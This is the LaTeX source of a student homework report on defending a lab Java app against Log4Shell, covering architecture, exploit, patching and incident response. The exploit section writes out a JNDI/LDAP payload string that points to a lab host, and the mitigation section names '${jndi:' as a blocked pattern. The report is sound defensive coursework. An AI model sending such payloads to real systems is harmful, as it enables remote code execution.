\documentclass[a4paper,12pt]{article}
\usepackage[utf8]{inputenc}
\usepackage{geometry}
\usepackage{graphicx}
\usepackage{hyperref}
\usepackage{titling}
\usepackage{parskip}
\geometry{margin=1in}
\usepackage{noto}
\title{Homework-9: Securing Systems Against Log4Shell}
\author{Nilansh Upadhyay}
\date{May 2025}
\begin{document}
\maketitle
\section{Architecture Diagram}
\begin{figure}[h]
    \centering
    \includegraphics[width=0.8\textwidth]{architecture_diagram.png}
    \caption{System Architecture: Java App, LDAP Server, and Attacker}
\end{figure}
The diagram shows a Spring Boot app in a Docker container (port 8080) logging input via Log4j. An attacker sends a malicious POST to /log, triggering a JNDI lookup to an LDAP server (port 1389).
\section{Exploit Explanation}
Log4Shell (CVE-2021-44228) in Log4j 2.14.1 enables remote code execution via JNDI lookups. The payload \texttt{\$\{jndi:ldap://host.docker.internal:1389/a\}} triggers a lookup to an attacker’s LDAP server, mapping to MITRE ATT\&CK T1190.
\section{Mitigation and Response Summary}
\subsection{Mitigation}
Updated Log4j to 2.17.0, disabling JNDI lookups. Added input validation in \texttt{LogController.java} to block \texttt{\$\{jndi:\}}. Redeployed and tested, aligning with MITRE DEFEND.
\subsection{Incident Response}
Using MITRE REACT:
\begin{itemize}
    \item \textbf{Detect}: Found \texttt{\$\{jndi:\}} in logs.
    \item \textbf{Contain}: Stopped container.
    \item \textbf{Eradicate}: Verified no processes.
    \item \textbf{Recover}: Deployed patched app.
\end{itemize}
\end{document}